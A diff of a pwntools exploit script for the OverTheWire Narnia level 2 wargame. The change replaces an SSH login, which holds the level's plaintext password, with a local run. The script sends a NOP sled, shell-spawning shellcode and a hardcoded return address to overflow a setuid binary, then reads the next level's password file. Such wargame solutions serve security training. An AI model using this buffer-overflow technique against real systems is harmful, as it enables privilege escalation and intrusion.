@@ -1,19 +1,14 @@
+# must be run from the machine - over ssh mangles the payload somehow
 from pwn import *
 
-s = ssh(host='narnia.labs.overthewire.org',port=2226,user='narnia2',password='nairiepecu')
-p = s.process('/narnia/narnia2')
-
+shellcode = asm(shellcraft.sh())
 payload = flat(
-    b'A'*132,
-    0x00002ab1,
-    asm(shellcraft.sh())
+    b'\x90'*(132 - len(shellcode)),
+    shellcode,
+    0xffffd850,
 )
 
-p.sendline(payload)
-
-p.recvuntil(b'$')
+p = process([b'/narnia/narnia2', payload])
 p.sendline(b'cat /etc/narnia_pass/narnia3')
 print('\nnarnia2 pass: ' + p.recvline().decode())
 
-p.close()
-s.close()
